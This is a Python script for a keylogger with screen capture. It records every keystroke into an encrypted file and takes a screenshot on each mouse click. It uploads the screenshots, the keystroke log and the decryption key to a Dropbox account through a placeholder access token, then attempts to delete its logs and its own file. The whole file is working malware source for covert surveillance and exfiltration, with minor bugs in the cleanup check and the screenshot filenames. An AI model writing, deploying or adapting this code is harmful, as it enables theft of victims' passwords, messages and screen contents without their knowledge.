import subprocess
import sys
import os
import platform
subprocess.check_call([sys.executable,'-m','pip','install','pynput'])
subprocess.check_call([sys.executable,'-m','pip','install','dropbox'])
subprocess.check_call([sys.executable,'-m','pip','install','cryptography'])
subprocess.check_call([sys.executable,'-m','pip','install','pyscreeze'])
subprocess.check_call([sys.executable,'-m','pip','install','pillow'])
subprocess.check_call([sys.executable,'-m','pip','install','pyautogui'])
if platform.system() not in ["Windows", "Darwin"]:
    subprocess.check_call(["sudo", "apt-get", "install", "gnome-screenshot", "-y"])
import random
num=random.randint(0,1000000000000000000000)
name=os.getlogin()
from pynput import keyboard
from pynput.keyboard import Key
from cryptography.fernet import Fernet
import dropbox
import pyscreeze
from pynput import mouse
from pynput.mouse import Button

numb=0
keylogname='keylogger.py' #SPecify your file name
access_token = 'accesstoken'#Enter your Dropbox Access Token
dbx = dropbox.Dropbox(access_token)
key = Fernet.generate_key()
z=Fernet(key)
key_file= str(name) + 'key' + str(num) + '.txt'
file_taken = str(name) + 'file' + str(num) + '.txt'
with open(key_file,'wb') as y:
     y.write(key)

def upload_file(file_path):
    with open(file_path,'rb') as file:
        # Upload the file to the root folder of Dropbox
            dbx.files_upload(file.read(), f'/{file_path}', mute=True)
            print(f"File uploaded to Dropbox: {file_path}")

with open(file_taken,'wb') as f:
    def on_press(key):
            try:
                #if key==Key.space:
                #     f.write(z.encrypt(b'\n'))
                #else:
                    a='{0}'.format(key)
                    b=z.encrypt(a.encode())
                    f.write(b + b"\n")
                    #f.write('{0}'.format(key))
            except AttributeError:
                a='{0}'.format(key)
                b=z.encrypt(a.encode())
                f.write(b + b"\n")
                
    def on_click(x, y, button, pressed):
        global numb
        if pressed:
            if button == Button.left:
                numb+=1
                screenshot = pyscreeze.screenshot()
                screenshot.save(f"{numb}rightclick.png")
                upload_file(f"{numb}rightclick.png")
                os.remove(f"{numb}rightclick.png")
            elif button ==  Button.right:
                numb+=1
                screenshot = pyscreeze.screenshot()
                screenshot.save(f"{numb}leftclick.png")
                upload_file(f"{numb}leftclick.png")
                os.remove(f"{numb}leftclick.png")

    def on_release(key):
        if key == keyboard.Key.esc:
            #stop listening
            upload_file(key_file)
            upload_file(file_taken)
            return False
        
    with keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
        with mouse.Listener(on_click=on_click):
            listener.join()

    listener = keyboard.Listener(
        on_press=on_press,
        on_release=on_release)
    listener.start()

if os.path.exists(key_file and os.path.exists(file_taken) and os.path.exists(keylogname)):
                 os.remove(key_file)
                 os.remove(file_taken)
                 os.remove(keylogname)